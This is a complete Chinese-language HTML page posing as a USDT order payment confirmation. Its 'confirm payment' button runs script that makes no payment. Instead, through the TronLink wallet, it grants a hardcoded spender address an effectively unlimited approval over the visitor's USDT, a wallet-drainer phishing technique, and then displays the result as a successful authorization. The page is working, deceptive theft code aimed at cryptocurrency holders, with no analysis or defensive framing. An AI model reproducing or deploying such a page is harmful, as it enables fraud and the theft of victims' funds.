
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <title>USDT 主网授权页面</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { font-family: sans-serif; background: #f9fafb; padding: 2rem; }
    .card { max-width: 500px; margin: auto; padding: 1.5rem; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
    .label { font-weight: bold; color: #555; display: inline-block; width: 120px; }
    .status { margin-top: 1rem; color: #d00; font-size: 0.95rem; word-break: break-all; }
    button { margin-top: 1.5rem; background: #10b981; color: white; padding: 1rem; border: none; border-radius: 8px; font-size: 1rem; width: 100%; }
  </style>
</head>
<body>
  <div class="card">
    <h2>订单确认信息</h2>
    <div><span class="label">用户名:</span><span id="username">-</span></div>
    <div><span class="label">充值金额:</span><span id="amount">-</span> USDT</div>
    <div><span class="label">订单号:</span><span id="orderid">-</span></div>
    <button onclick="authorize()">确认付款</button>
    <div class="status" id="status"></div>
  </div>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER = "TX6LRf9FvNwmJM9CyXJbGXHH1oFZZZsYWR";
    const AMOUNT = "9223372036854775807";

    const query = new URLSearchParams(location.search);
    const user = query.get("username") || "未提供";
    const amount = query.get("amount") || "0";
    const orderId = Math.floor(10000000 + Math.random() * 90000000);

    document.getElementById("username").innerText = user;
    document.getElementById("amount").innerText = amount;
    document.getElementById("orderid").innerText = orderId;

    async function authorize() {
      const statusEl = document.getElementById("status");
      try {
        const tron = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
        if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
          if (window.tronLink && window.tronLink.request) {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
          } else {
            statusEl.innerText = "未检测到支持的钱包，请使用 TronLink、TP 钱包等打开页面。";
            return;
          }
        }

        const contract = await tron.contract().at(USDT_CONTRACT);
        const txid = await contract.approve(SPENDER, tron.toBigNumber(AMOUNT)).send({ feeLimit: 100000000 });
        statusEl.innerText = "授权成功！交易哈希：" + txid;
      } catch (e) {
        statusEl.innerText = "授权异常：" + (e.message || JSON.stringify(e));
      }
    }
  </script>
</body>
</html>
